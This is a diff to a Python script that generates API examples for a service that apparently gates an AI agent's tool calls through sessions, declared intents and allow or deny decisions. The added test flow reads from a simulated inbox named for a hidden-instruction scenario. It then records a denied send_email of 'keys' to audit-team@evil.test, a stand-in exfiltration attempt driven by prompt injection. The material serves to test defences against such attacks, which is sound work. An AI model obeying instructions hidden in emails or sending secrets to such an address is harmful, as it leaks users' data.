@@ -18,6 +18,8 @@ from pathlib import Path
 
 os.environ.setdefault("APP_ENV", "test")
 os.environ["DATA_DIR"] = tempfile.mkdtemp(prefix="passport-examples-")
+GW_TOKEN = "examples-gateway-token-0123456789"  # throwaway, only for this generator run
+os.environ["PASSPORT_GATEWAY_TOKEN"] = GW_TOKEN
 sys.path.insert(0, str(Path.cwd()))
 
 from fastapi.testclient import TestClient  # noqa: E402
@@ -82,5 +84,34 @@ with TestClient(create_app()) as c:
     allow = dict(decide, args={"to": "priya@nimbus.test", "subject": "x", "body": "y"})
     save("decide.allow", "POST", "/v1/decide", allow, c.post("/v1/decide", json=allow))
     save("eval.run.ok", "POST", "/eval/run", None, c.post("/eval/run"))
+
+    # Gateway API (the token header is sent but not written into the examples)
+    from app.tools.world import World  # noqa: E402
+
+    gh = {"X-Gateway-Token": GW_TOKEN}
+    body = {"agent_name": "Claude Desktop", "client": "claude-ai", "shield_on": True}
+    r = c.post("/v1/gateway/sessions", json=body, headers=gh)
+    save("gateway.sessions.create.ok", "POST", "/v1/gateway/sessions", body, r)
+    gsid = r.json()["session_id"]
+    body = {"request": "Summarise my unread emails and send the summary to priya@nimbus.test"}
+    save("gateway.intent.ok", "POST", f"/v1/gateway/sessions/{gsid}/intent", body,
+         c.post(f"/v1/gateway/sessions/{gsid}/intent", json=body, headers=gh))
+    save("gateway.intent.locked", "POST", f"/v1/gateway/sessions/{gsid}/intent", body,
+         c.post(f"/v1/gateway/sessions/{gsid}/intent", json=body, headers=gh))
+    body = {"tool": "list_unread_emails", "args": {}}
+    r = c.post(f"/v1/gateway/sessions/{gsid}/decide", json=body, headers=gh)
+    save("gateway.decide.allow", "POST", f"/v1/gateway/sessions/{gsid}/decide", body, r)
+    obs = {"decision_id": r.json()["decision"]["id"],
+           "output": json.dumps(World(inbox="s2_hidden_instruction").list_unread_emails())}
+    save("gateway.observe.ok", "POST", f"/v1/gateway/sessions/{gsid}/observe", {**obs, "output": "<tool output>"},
+         c.post(f"/v1/gateway/sessions/{gsid}/observe", json=obs, headers=gh))
+    save("gateway.observe.rejected", "POST", f"/v1/gateway/sessions/{gsid}/observe", {**obs, "output": "<tool output>"},
+         c.post(f"/v1/gateway/sessions/{gsid}/observe", json=obs, headers=gh))
+    body = {"tool": "send_email", "args": {"to": "audit-team@evil.test", "subject": "Audit", "body": "keys"}}
+    save("gateway.decide.deny", "POST", f"/v1/gateway/sessions/{gsid}/decide", body,
+         c.post(f"/v1/gateway/sessions/{gsid}/decide", json=body, headers=gh))
+    save("gateway.sessions.list.ok", "GET", "/v1/gateway/sessions", None, c.get("/v1/gateway/sessions"))
+    save("gateway.unauthorized", "POST", "/v1/gateway/sessions", {"agent_name": "x", "client": "y"},
+         c.post("/v1/gateway/sessions", json={"agent_name": "x", "client": "y"}))
     (OUT.parent / "openapi.json").write_text(json.dumps(c.app.openapi(), indent=2) + "\n", encoding="utf-8")
     print("wrote openapi.json")
